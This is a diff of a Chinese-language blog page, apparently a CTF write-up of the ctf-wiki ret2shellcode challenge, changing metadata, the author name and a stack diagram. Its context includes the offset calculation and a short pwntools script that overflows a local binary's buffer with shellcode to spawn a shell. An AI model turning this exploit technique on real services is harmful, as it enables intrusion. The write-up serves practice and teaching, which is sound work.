@@ -11,12 +11,13 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2shellcode">
 <meta property="og:url" content="http://yoursite.com/2019/03/26/ret2shellcode/index.html">
-<meta property="og:site_name" content="ConzeHsu&#39;s blog">
+<meta property="og:site_name" content="c9b1fd68fdad">
 <meta property="og:description" content="一道 ctf-wiki 上的题目，题目地址：ret2shellcode 直接将断点断在 gets危险函数处，地址为0x08048593，  我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的esp+0x1c，我们需要以算出相对于 ebp的偏移，而现在已知EBP=0xffffd698、ESP=0xffffd610  因此，由下 picture 1可以得到，输入相对于ebp的偏移是0x6c">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8eqa1maj30jf0f40ub.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8qdui38j30je0ghdhj.jpg">
-<meta property="og:updated_time" content="2019-03-26T07:59:07.533Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g975zeo7j30lz09t74b.jpg">
+<meta property="og:updated_time" content="2019-03-26T08:13:23.585Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ret2shellcode">
 <meta name="twitter:description" content="一道 ctf-wiki 上的题目，题目地址：ret2shellcode 直接将断点断在 gets危险函数处，地址为0x08048593，  我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的esp+0x1c，我们需要以算出相对于 ebp的偏移，而现在已知EBP=0xffffd698、ESP=0xffffd610  因此，由下 picture 1可以得到，输入相对于ebp的偏移是0x6c">
@@ -114,7 +115,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">ConzeHsu's blog</span>
+        <span itemprop="name">c9b1fd68fdad</span>
       </span>
       
     <div class="postdate">
@@ -145,7 +146,7 @@
 <p>我们由下图可以观察到，我们输入的内容的地址是相对于esp而言的<code>esp+0x1c</code>，我们需要以算出相对于 <code>ebp</code>的偏移，而现在已知<code>EBP=0xffffd698</code>、<code>ESP=0xffffd610</code></p>
 <p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g8qdui38j30je0ghdhj.jpg" alt=""></p>
 <p>因此，由下 <code>picture 1</code>可以得到，输入相对于ebp的偏移是<code>0x6c</code>，即需要填充的大小为<code>0x6c+0x04</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">											+---------------+</span><br><span class="line">											|	 retaddr	|</span><br><span class="line">											+---------------+</span><br><span class="line">               								|	 saved ebp	|</span><br><span class="line">0xffff698  +---------------+			  ebp	+---------------+</span><br><span class="line">		|				|					|				|</span><br><span class="line">		|				|					|	 padding	|</span><br><span class="line">		|	len=0x6c	|					|				|</span><br><span class="line">		|				|					|				|</span><br><span class="line">		|				|					+---------------+</span><br><span class="line">0xffffd62c	+---------------+					|				|</span><br><span class="line">		|	len=0x1c	|					|	shellcode	|</span><br><span class="line">		|				|					|				|</span><br><span class="line">0xffffd610 +---------------|			-0x6c	+---------------+</span><br><span class="line">			picture 1                           picture 2</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g1g975zeo7j30lz09t74b.jpg" alt=""></p>
 <p>由<code>picture 2</code>可以得出以下的题解。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())	<span class="comment">#生成shellcode代码</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span>		<span class="comment">#调用strncpy需要拷贝进的buf地址</span></span><br><span class="line">payload=shellcode+<span class="string">'a'</span>*(<span class="number">0x6c</span>+<span class="number">0x04</span>-len(shellcode))+p32(buf2_addr)</span><br><span class="line"><span class="comment">#payload = shellcode.ljust(112, 'A')+p32(buf2_addr) #与上一行等效</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><blockquote>
